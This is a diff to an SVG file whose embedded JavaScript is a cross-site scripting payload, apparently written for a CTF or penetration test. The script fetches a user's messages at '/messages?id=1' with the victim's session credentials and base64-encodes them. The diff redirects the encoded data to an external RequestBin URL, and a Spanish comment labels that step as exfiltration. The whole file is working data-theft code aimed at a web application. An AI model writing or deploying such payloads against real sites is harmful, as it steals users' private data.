@@ -1,16 +1,18 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
+<svg xmlns="http://www.w3.org/2000/svg">
   <script><![CDATA[
     (async function(){
       try {
-        const adminId = 0;
+        const adminId = 1;
         const resp = await fetch('/messages?id=' + adminId, {credentials: 'same-origin'});
         const json = await resp.json();
         const b64 = btoa(unescape(encodeURIComponent(JSON.stringify(json))));
-        window.location = '/?probe=' + encodeURIComponent(b64);
+        // Exfiltración a tu RequestBin:
+        top.location = 'http://requestbin.whapi.cloud/14touqb1/?d=' + encodeURIComponent(b64);
       } catch (e) {
-        try { window.location = '/?probe=err:' + encodeURIComponent(String(e)); } catch(e2) {}
+        try { top.location = '/?probe=' + encodeURIComponent('err:'+String(e)); } catch(_) {}
       }
     })();
   ]]></script>
 </svg>
+
